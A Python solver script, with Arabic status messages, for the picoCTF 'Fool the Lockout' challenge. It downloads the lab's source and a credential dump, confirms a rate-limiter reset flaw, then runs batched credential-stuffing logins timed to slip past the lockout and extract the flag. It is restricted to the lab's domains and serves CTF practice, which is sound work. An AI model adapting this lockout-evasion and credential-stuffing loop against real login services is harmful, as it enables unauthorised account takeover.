"""Bounded, source-verified solver for the picoCTF Fool the Lockout lab."""
from __future__ import annotations

import http.cookiejar
import re
import time
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path
from urllib.parse import urlsplit, urlunsplit

ALLOWED_SUFFIXES = (".cylabacademy.net", ".cylabacademy.org")
FLAG_RE = re.compile(r"(?:picoCTF|academy|flag|CTF)\{[^{}\r\n]{2,200}\}", re.I)
MAX_DUMP_BYTES = 2 * 1024 * 1024
MAX_SOURCE_BYTES = 256 * 1024


class _NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def normalize(text: str) -> str:
    return re.sub(r"(https?)\\:", r"\1:", text or "", flags=re.I)


def parse_target(challenge_text: str) -> str | None:
    text = normalize(challenge_text)
    m = re.search(r"https?://[a-z0-9.-]+\.cylabacademy\.(?:net|org)(?::\d{1,5})?(?:/[^\s<>\]\"']*)?", text, re.I)
    if not m:
        return None
    raw = m.group(0).rstrip(".,)")
    u = urlsplit(raw)
    try:
        port = u.port
    except ValueError:
        return None
    host = (u.hostname or "").lower().rstrip(".")
    if u.username or u.password or not any(host.endswith(s) and host[:-len(s)] for s in ALLOWED_SUFFIXES):
        return None
    if port is not None and not 1 <= port <= 65535:
        return None
    return urlunsplit((u.scheme.lower(), u.netloc, "/", "", ""))


def _artifact_urls(challenge_text: str) -> tuple[str | None, str | None]:
    text = normalize(challenge_text)
    pattern = r"https://challenge-files\.cylabacademy\.net/library/[0-9a-f]{64}/(app\.py|creds-dump\.txt)"
    found = {}
    for match in re.finditer(pattern, text, re.I):
        url = match.group(0)
        found[match.group(1).lower()] = url
    return found.get("app.py"), found.get("creds-dump.txt")


def _download(url: str, dest: Path, limit: int) -> None:
    req = urllib.request.Request(url, headers={"User-Agent": "CTF-Falcon-FoolLockout/2.34.0 (authorized CTF)"})
    opener = urllib.request.build_opener(_NoRedirect())
    try:
        response = opener.open(req, timeout=12)
    except urllib.error.HTTPError as e:
        response = e
    if response.code != 200:
        code = response.code
        response.close()
        raise RuntimeError(f"تعذر تنزيل ملف التحدي (HTTP {code}).")
    data = response.read(limit + 1)
    response.close()
    if len(data) > limit:
        raise RuntimeError("حجم ملف التحدي تجاوز الحد المسموح.")
    dest.write_bytes(data)


def _load_and_verify_source(path: Path) -> tuple[int, int, int]:
    src = path.read_text(encoding="utf-8", errors="replace")
    def constant(name: str) -> int:
        m = re.search(rf"(?m)^\s*{name}\s*=\s*(\d+)\b", src)
        if not m:
            raise RuntimeError(f"لم يجد صقر قيمة {name} في app.py.")
        return int(m.group(1))
    max_requests = constant("MAX_REQUESTS")
    epoch_duration = constant("EPOCH_DURATION")
    lockout_duration = constant("LOCKOUT_DURATION")
    # Verify the exact defect before trying any credentials: the counter resets
    # at EPOCH_DURATION, while the supposed lockout timestamp is not consulted.
    evidence = ("curr_time - epoch_start_time > EPOCH_DURATION" in src and
                "request_rates[client_ip]['num_requests'] > MAX_REQUESTS" in src and
                "lockout_until" in src and
                not re.search(r"(?:curr_time|time\.time\(\))\s*<\s*request_rates\[client_ip\]\[['\"]lockout_until['\"]\]", src))
    if not evidence or max_requests < 1 or epoch_duration < 1 or lockout_duration <= epoch_duration:
        raise RuntimeError("مصدر التطبيق لا يطابق خلل إعادة ضبط عداد حدّ المحاولات؛ أوقف صقر المحاولات.")
    return max_requests, epoch_duration, lockout_duration


def _read_pairs(path: Path, limit: int = 300) -> list[tuple[str, str]]:
    pairs = []
    for line in path.read_text(encoding="utf-8-sig", errors="replace").splitlines():
        line = line.strip()
        if not line or ";" not in line:
            continue
        username, password = line.split(";", 1)
        if username and password:
            pairs.append((username, password))
            if len(pairs) >= limit:
                break
    if not pairs:
        raise RuntimeError("ملف creds-dump.txt فارغ أو لا يستخدم صيغة username;password.")
    return pairs


def solve(challenge_text: str, analysis_root: Path, *, progress=None,
          opener_factory=urllib.request.build_opener, sleeper=time.sleep,
          clock=time.monotonic) -> dict:
    target = parse_target(challenge_text)
    source_url, creds_url = _artifact_urls(challenge_text)
    if not target:
        return {"ok": False, "success": False, "error": "لم يجد صقر رابط مثيل صالحًا ضمن نطاق Cylab Academy."}
    if not source_url or not creds_url:
        return {"ok": False, "success": False, "error": "يلزم وجود رابط app.py ورابط creds-dump.txt في وصف التحدي."}
    folder = analysis_root / "fool_the_lockout"
    folder.mkdir(parents=True, exist_ok=True)
    source_path, creds_path = folder / "app.py", folder / "creds-dump.txt"
    try:
        _download(source_url, source_path, MAX_SOURCE_BYTES)
        _download(creds_url, creds_path, MAX_DUMP_BYTES)
        max_requests, epoch_duration, lockout_duration = _load_and_verify_source(source_path)
        pairs = _read_pairs(creds_path)
    except Exception as exc:
        return {"ok": False, "success": False, "target": target, "error": str(exc)[:300],
                "files_saved_to": str(folder)}

    jar = http.cookiejar.CookieJar()
    opener = opener_factory(urllib.request.HTTPCookieProcessor(jar), _NoRedirect())
    origin = urlsplit(target)
    steps = []
    attempts = 0
    checked = 0
    blocked_recoveries = 0

    def request(method: str, path: str, fields: dict | None = None):
        url = urllib.parse.urljoin(target, path)
        u = urlsplit(url)
        if (u.scheme, u.hostname, u.port) != (origin.scheme, origin.hostname, origin.port):
            raise RuntimeError("تم إيقاف طلب خارج أصل مثيل التحدي.")
        data = urllib.parse.urlencode(fields).encode() if fields is not None else None
        req = urllib.request.Request(url, data=data, method=method,
              headers={"User-Agent": "CTF-Falcon-FoolLockout/2.34.0 (authorized CTF)",
                       "Accept": "text/html,*/*"})
        try:
            response = opener.open(req, timeout=8)
        except urllib.error.HTTPError as e:
            response = e
        raw = response.read(1024 * 1024 + 1)
        if len(raw) > 1024 * 1024:
            response.close()
            raise RuntimeError("استجابة المثيل تجاوزت الحد المسموح.")
        code, body, location = response.code, raw.decode("utf-8", "replace"), response.headers.get("Location")
        response.close()
        return code, body, location

    try:
        code, login_page, _ = request("GET", "/login")
        if code != 200 or not re.search(r'name=[\"\']username[\"\']', login_page, re.I) or not re.search(r'name=[\"\']password[\"\']', login_page, re.I):
            raise RuntimeError("صفحة تسجيل الدخول لا تطابق حقول التطبيق؛ لم تُرسل بيانات الاعتماد.")
        steps.append({"method": "GET", "path": "/login", "status": code})
        index = 0
        while index < len(pairs):
            batch_started = None
            batch_count = 0
            while index < len(pairs) and batch_count < max_requests:
                username, password = pairs[index]
                if batch_started is None:
                    batch_started = clock()
                code, body, location = request("POST", "/login", {"username": username, "password": password})
                attempts += 1
                steps.append({"method": "POST", "path": "/login", "status": code})
                if "Rate Limited Exceeded" in body or code == 429:
                    blocked_recoveries += 1
                    if blocked_recoveries > 3:
                        raise RuntimeError("استمر المثيل بحجب الطلبات بعد إعادة نافذة العداد؛ أوقف المحاولات.")
                    wait_for = max(0.0, epoch_duration + 1.0 - (clock() - batch_started))
                    if progress:
                        progress(attempts, checked, len(pairs), "waiting", wait_for)
                    sleeper(wait_for)
                    batch_count = 0
                    batch_started = None
                    continue
                if code in (301, 302, 303) and location:
                    code2, home, _ = request("GET", "/")
                    steps.append({"method": "GET", "path": "/", "status": code2})
                    flag = FLAG_RE.search(home)
                    if flag:
                        return {"ok": True, "success": True, "flag": flag.group(0), "target": target,
                                "attempts": attempts, "checked": checked + 1, "entries": len(pairs),
                                "reset_window_seconds": epoch_duration, "nominal_lockout_seconds": lockout_duration,
                                "files_saved_to": str(folder), "steps": steps,
                                "explanation_ar": ["قرأ صقر القيم من app.py وتحقق من أن العداد يُصفّر بعد نافذة أقصر من مدة الحظر المعلنة.",
                                    f"جرّب {checked + 1} سجلًا من creds-dump.txt على دفعات لا تتجاوز {max_requests} محاولات، وانتظر انتهاء نافذة {epoch_duration} ثانية بين الدفعات.",
                                    "سجّل الدخول بالحساب المطابق واستخرج العلم من الصفحة الرئيسية."], "warnings": []}
                    raise RuntimeError("قبل المثيل بيانات دخول، لكن لم يظهر العلم في الصفحة الرئيسية.")
                checked += 1
                index += 1
                batch_count += 1
                if progress:
                    progress(attempts, checked, len(pairs), "trying", 0)
            if index < len(pairs):
                wait_for = max(0.0, epoch_duration + 1.0 - (clock() - (batch_started or clock())))
                if progress:
                    progress(attempts, checked, len(pairs), "waiting", wait_for)
                sleeper(wait_for)
        return {"ok": True, "success": False, "target": target, "attempts": attempts,
                "checked": checked, "entries": len(pairs), "reset_window_seconds": epoch_duration,
                "files_saved_to": str(folder), "steps": steps,
                "explanation_ar": [f"انتهى الملف بعد {checked} سجلًا دون نجاح. أتاح الخلل {max_requests} محاولات لكل نافذة {epoch_duration} ثانية."],
                "warnings": ["قد يختلف الحساب التجريبي في مثيل جديد؛ تحقق من أن المثيل الحالي نشط."]}
    except Exception as exc:
        return {"ok": False, "success": False, "target": target, "attempts": attempts,
                "checked": checked, "entries": len(pairs), "files_saved_to": str(folder),
                "steps": steps, "error": str(exc)[:300],
                "warnings": ["لم يُدرج صقر كلمات المرور أو بيانات الجلسة في النتيجة."]}
